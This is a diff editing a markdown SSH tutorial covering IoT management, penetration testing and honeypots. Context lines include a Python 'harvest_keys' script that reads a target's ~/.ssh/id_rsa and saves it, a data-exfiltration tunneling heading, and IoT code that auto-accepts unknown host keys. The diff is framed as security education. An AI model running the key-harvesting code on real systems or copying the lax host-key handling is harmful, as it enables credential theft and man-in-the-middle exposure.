@@ -1,6 +1,12 @@
 # 🚀 SSH Mastery: Extreme Techniques and Applications 🌟
 
-## 19. 🏠 SSH in IoT and Smart Home Automation
+## Table of Contents
+1. [🏠 SSH in IoT and Smart Home Automation](#-ssh-in-iot-and-smart-home-automation)
+2. [🛡️ Advanced SSH Penetration Testing Techniques](#️-advanced-ssh-penetration-testing-techniques)
+3. [🎭 SSH Honeypots for Threat Intelligence](#-ssh-honeypots-for-threat-intelligence)
+4. [🌟 Conclusion: The Future of SSH in Cybersecurity and IoT](#-conclusion-the-future-of-ssh-in-cybersecurity-and-iot)
+
+## 🏠 SSH in IoT and Smart Home Automation
 
 ### 19.1 Secure Remote Management of IoT Devices
 
@@ -68,10 +74,10 @@ def send_command_to_device(device_ip, command):
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     ssh.connect(device_ip, username='smarthome', key_filename='~/.ssh/smarthome_rsa')
-    
+
     stdin, stdout, stderr = ssh.exec_command(command)
     response = stdout.read().decode()
-    
+
     ssh.close()
     return json.loads(response)
 
@@ -93,7 +99,7 @@ This method ensures that all communications with smart home devices are encrypte
 
 **Screenshot description:** The image shows a Python IDE with the script open. The code is syntax-highlighted for readability. Below the script, there's a console output showing a sample device status in JSON format.
 
-[Diagram: SSH usage in IoT and smart home environments]
+### SSH usage in IoT and smart home environments
 
 ```mermaid
 graph TD
@@ -110,7 +116,7 @@ This diagram illustrates how SSH is used in a smart home environment:
 - The gateway then uses SSH to communicate with various smart devices
 - Remote management and data collection are also performed securely through SSH connections
 
-## 20. 🛡️ Advanced SSH Penetration Testing Techniques
+## 🛡️ Advanced SSH Penetration Testing Techniques
 
 ### 20.1 SSH Tunneling for Data Exfiltration
 
@@ -156,13 +162,13 @@ def harvest_keys(target, username, password):
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     ssh.connect(target, username=username, password=password)
-    
+
     stdin, stdout, stderr = ssh.exec_command('cat ~/.ssh/id_rsa')
     harvested_key = stdout.read().decode()
-    
+
     with open(f'harvested_{username}_key', 'w') as f:
         f.write(harvested_key)
-    
+
     ssh.close()
     print(f"Key harvested for {username} on {target}")
 
@@ -181,7 +187,7 @@ This technique could be used by attackers to gain unauthorized access to other s
 
 **Screenshot description:** The image shows a terminal window with the output of the Python script. It displays a message indicating successful key harvesting, along with the name of the file where the harvested key was saved.
 
-## 21. 🎭 SSH Honeypots for Threat Intelligence
+## 🎭 SSH Honeypots for Threat Intelligence
 
 ```python
 import socket
@@ -206,7 +212,7 @@ def start_server():
     sock.bind(('0.0.0.0', 2222))
     sock.listen(100)
     print("SSH Honeypot running on port 2222...")
-    
+
     while True:
         client, addr = sock.accept()
         print(f"Connection from: {addr[0]}:{addr[1]}")
@@ -227,7 +233,7 @@ This honeypot can help security teams understand attack patterns and collect inf
 
 **Screenshot description:** The image displays a terminal window showing the SSH honeypot script running. It shows multiple lines of output, each indicating a connection attempt from a different IP address, along with the usernames and passwords used in these attempts.
 
-[Diagram: Advanced SSH penetration testing techniques]
+### Advanced SSH penetration testing techniques
 
 ```mermaid
 graph TD
@@ -248,9 +254,7 @@ This diagram illustrates various advanced SSH techniques used in penetration tes
 
 Understanding these techniques helps in building more robust defenses against sophisticated attacks.
 
-## 22. 🌟 Conclusion: The Future of SSH in Cybersecurity and IoT
-
-[Content remains the same as in the previous version]
+## 🌟 Conclusion: The Future of SSH in Cybersecurity and IoT
 
 As we've explored throughout this guide, SSH is not just a tool for secure remote access, but a versatile Swiss Army knife in the realms of cybersecurity and IoT. Its applications span from IoT device management to AI computation distribution, and from smart home automation to advanced penetration testing.
 
